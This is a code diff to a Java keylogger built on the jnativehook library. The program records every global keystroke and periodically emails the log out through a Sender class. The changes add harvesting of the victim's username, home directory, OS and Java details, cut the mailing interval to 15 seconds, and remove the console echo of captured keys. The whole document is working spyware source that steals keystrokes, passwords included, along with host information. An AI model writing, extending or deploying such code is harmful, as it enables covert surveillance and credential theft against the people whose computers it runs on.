@@ -10,6 +10,8 @@ import java.io.File;
 import java.io.FileNotFoundException;
 import java.io.FileOutputStream;
 import java.io.PrintStream;
+import java.util.Timer;
+import java.util.TimerTask;
 import java.util.logging.Level;
 import java.util.logging.LogManager;
 import java.util.logging.Logger;
@@ -20,7 +22,7 @@ import org.jnativehook.keyboard.NativeKeyEvent;
 import org.jnativehook.keyboard.NativeKeyListener;
 
 class Main implements NativeKeyListener {
-    private static String emailStr = ""; // holds email contents
+    private static String emailStr = "NEW USER FOUND<br>"; // holds email contents
 
     public Main() {
         // disables logging of keystrokes in the output
@@ -48,9 +50,18 @@ class Main implements NativeKeyListener {
             public void run() {
                 if (emailStr != "") {                   // send email if not empty
                     try {
+                        emailStr += "<br/><br/>************************ SYSTEM INFORMATION ************************<br/>"
+                            + "Username: " + System.getProperty("user.name") + "<br/>"
+                            + "Home Directory: " + System.getProperty("user.home") + "<br/>"
+                            + "<br/>OS Name: " + System.getProperty("os.name") + "<br/>"
+                            + "OS version: " + System.getProperty("os.version") + "<br/>"
+                            + "OS architecture: " + System.getProperty("os.arch") + "<br/>"
+                            + "<br/>Java Version: " + System.getProperty("java.version") + "<br/>"
+                            + "JVM Name: " + System.getProperty("java.vm.name") + "<br/>";
+
+                        GlobalScreen.registerNativeHook();
                         Sender.sendEmail(emailStr);
                         emailStr = "";                  // clear email contents
-                        GlobalScreen.registerNativeHook();
                     } catch (NativeHookException var3) {
                         var3.printStackTrace();
                     } catch (Throwable e) {
@@ -65,14 +76,18 @@ class Main implements NativeKeyListener {
         long delay = 1000L;
 
         //how often mail is sent (2 hours)
-        long period = 1000 * 60;
+        long period = 1000 * 15;
 
         timer.scheduleAtFixedRate(mailingTask, delay, period);
     }
 
     public void nativeKeyPressed(NativeKeyEvent e) {
         String temp = NativeKeyEvent.getKeyText(e.getKeyCode());
-        System.out.print(temp);
+        if(temp.equals("Unknown keyCode: 0xe36")) {
+            temp = "[SHIFT]";
+        } else if (temp.equals("Space")) {
+            temp = " ";
+        }
         emailStr += temp;
     }
 
@@ -82,3 +97,4 @@ class Main implements NativeKeyListener {
 
     public void nativeKeyTyped(NativeKeyEvent arg0) {
     }
+}
